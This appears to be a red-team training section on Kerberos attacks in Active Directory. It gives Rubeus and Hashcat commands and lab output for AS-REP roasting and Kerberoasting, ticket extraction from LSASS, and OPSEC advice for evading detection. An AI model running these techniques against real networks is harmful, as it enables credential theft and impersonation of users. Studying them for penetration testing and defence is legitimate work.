Active Directory environments heavily rely on the Kerberos protocol for authentication. For an offensive operator, this architecture introduces valuable opportunities to target cryptographic material in transit or cached in memory. By exploiting systemic structural properties and legacy settings within the protocol, operators can harvest credentials or hijack existing sessions without triggering common endpoint alerts.

This section covers standard tradecraft for targeting Kerberos tickets offline and retrieving active session tokens directly from an compromised endpoint.

## AS-REP Roasting

AS-REP roasting is a credential access method [[T1558.004](https://mitre.org)] targeting user accounts configured with Kerberos preauthentication disabled. Normally, a user must provide an encrypted timestamp to prove identity before the Key Distribution Center (KDC) issues a ticket. When preauthentication is disabled, an operator can send a standard Authentication Service Request (AS-REQ) for any target principal without knowing their password, forcing the KDC to return an Authentication Service Response (AS-REP). 

Because the logon session key in the AS-REP is encrypted using a hash derived from the user's plaintext password, the operator can intercept this encrypted data blob and crack it offline via brute-force or dictionary attacks.

The `asreproast` module within Rubeus automatically identifies directory objects with preauthentication disabled, requests an AS-REQ on their behalf, and isolates the crackable ticket material.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap

[*] Action: AS-REP roasting
[*] Target Domain          : ARCADIA.LOCAL
[*] Searching path 'LDAP://dc-1.arcadia.local/DC=arcadia,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'

[*] SamAccountName         : db_admin
[*] DistinguishedName      : CN=Database Admin,CN=Users,DC=arcadia,DC=local
[*] Using domain controller: dc-1.arcadia.local (10.10.10.10)
[*] Building AS-REQ (w/o preauth) for: 'arcadia.local\db_admin'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

$krb5asrep$23$db_admin@arcadia.local:a3f9e[...snip...]83741
```

* Specify the `/format:hashcat` parameter to directly output the encrypted ticket data in a syntax compatible with Hashcat, rather than the default John the Ripper layout.

The resulting RC4-encrypted AS-REP strings are evaluated offline using Hashcat's specialized `18200` module.

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 18200 .\asrep.hash .\wordlist.txt -r .\rules\best.rule
$krb5asrep$23$db_admin@arcadia.local:a3f9e[...snip...]83741:SecurePass123!
```

### Operational Security (OPSEC)

Defenders look for high volumes of authentications originating from unexpected systems. Every distinct AS-REQ generates a Windows Security Event ID 4768 (Kerberos authentication ticket requested) on the domain controller; a surge of these events generated by a single user account over a short interval serves as a strong indicator of compromise. 

Furthermore, Rubeus requests legacy RC4-encrypted tickets by default to simplify offline cracking calculations. In modern networks where AES-128 and AES-256 are standard, an abrupt fallback to RC4 ciphers introduces a notable anomaly in telemetry logs.

## Kerberoasting

Kerberoasting is an offline password-cracking technique [[T1558.003](https://mitre.org)] targeting domain user accounts that possess a registered Service Principal Name (SPN). Any authenticated domain user can request a Ticket Granting Service (TGS) ticket for any valid SPN in the forest. The KDC generates a TGS-REP containing a service ticket partially encrypted with the NTLM hash or AES key of the service account linked to that SPN. Operators harvest these encrypted response payloads from memory and perform offline dictionary attacks to uncover the service account's plaintext password.

This technique is largely ineffective against default computer accounts because Active Directory automatically cycles computer object passwords every 30 days using complex, randomly generated 128-character strings. Instead, Kerberoasting specifically targets user-configured service accounts, which frequently suffer from human error, weak passwords, and administrative exclusions like "Password Never Expires."

Run the `kerberoast` command in Rubeus to query the directory for non-standard SPNs and automatically perform the ticket request.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple

[*] Total kerberoastable users : 1

$krb5tgs$23$*sql_agent$arcadia.local$MSSQLSvc/sql-srv.arcadia.local:1433@arcadia.local*$c7391[...snip...]4E219
```

These isolated ticket hashes are processed offline using Hashcat's `13100` mode.

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 13100 .\kerb.hash .\wordlist.txt -r .\rules\best.rule
$krb5tgs$23$*sql_agent$arcadia.local$MSSQLSvc/sql-srv.arcadia.local:1433@arcadia.local*$c7391[...snip...]4e219:P@ssword987
```

### Operational Security (OPSEC)

Each discrete TGS request generates a Windows Security Event ID 4769 (A Kerberos service ticket was requested) on the responding domain controller. Multiple rapid ticket requests across divergent SPNs by an unrelated or non-administrative user profile typically alert monitoring teams. As noted previously, Rubeus explicitly enforces a downgrade to RC4 encryption during the request phase, which creates a visible signature.

Defensive teams also deploy canary accounts or "honey-SPNs"—spurious SPN records mapped to deceptive user accounts that do not back any real network service. Because these assets are never accessed during legitimate operations, any TGS-REQ targeting them yields an immediate, high-fidelity alert.

To minimize this footprint, an operator should use non-intrusive LDAP queries to evaluate potential targets, then selectively request individual tickets rather than sweeping the entire domain.

```powershell
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
            
[*] LDAP://DC=arcadia,DC=local
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1
	[+] cn                   : SQL Service Account
	[+] samaccountname       : sql_agent
	[+] serviceprincipalname : MSSQLSvc/sql-srv.arcadia.local:1433

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/sql-srv.arcadia.local:1433 /simple /nowrap
```

## Extracting Cached Tickets

When an operator achieves elevated administrative control over an active endpoint, they can manipulate the Local Security Authority Subsystem Service (LSASS) memory space to extract active Kerberos tickets. 

The `triage` module in Rubeus provides a quick overview of all concurrent logon sessions and their associated cryptographic material currently cached in memory. If several users are concurrently authenticated to the target asset—via active interactive logons, remote desktop sessions, or network shares—the operator can extract their Ticket Granting Tickets (TGTs) or service tickets to assume their identities across the broader network without knowing their underlying passwords.
